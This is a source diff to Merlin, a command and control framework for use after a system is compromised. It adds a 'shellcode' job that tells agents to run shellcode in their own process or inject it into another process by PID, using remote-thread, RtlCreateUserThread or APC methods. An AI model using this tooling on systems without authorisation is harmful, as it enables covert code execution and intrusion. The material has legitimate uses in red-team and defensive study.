@@ -1,6 +1,6 @@
 // Merlin is a post-exploitation command and control framework.
 // This file is part of Merlin.
-// Copyright (C) 2018  Russel Van Tuyl
+// Copyright (C) 2019  Russel Van Tuyl
 
 // Merlin is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
@@ -400,6 +400,25 @@ func GetMessageForJob(agentID uuid.UUID, job Job) (messages.Base, error) {
 
 		k := marshalMessage(p)
 		m.Type = "CmdPayload"
+		m.Payload = (*json.RawMessage)(&k)
+	case "shellcode":
+		m.Type = "Shellcode"
+		p := messages.Shellcode{
+			Method: job.Args[0],
+			Job:	job.ID,
+		}
+
+		if p.Method == "self"{
+			p.Bytes = 	job.Args[1]
+		} else if p.Method == "remote" || p.Method == "rtlcreateuserthread" || p.Method == "userapc" {
+			i, err 	:= 	strconv.Atoi(job.Args[1])
+			if err != nil {
+				return m, err
+			}
+			p.PID = uint32(i)
+			p.Bytes = 	job.Args[2]
+		}
+		k := marshalMessage(p)
 		m.Payload = (*json.RawMessage)(&k)
 	case "download":
 		m.Type = "FileTransfer"
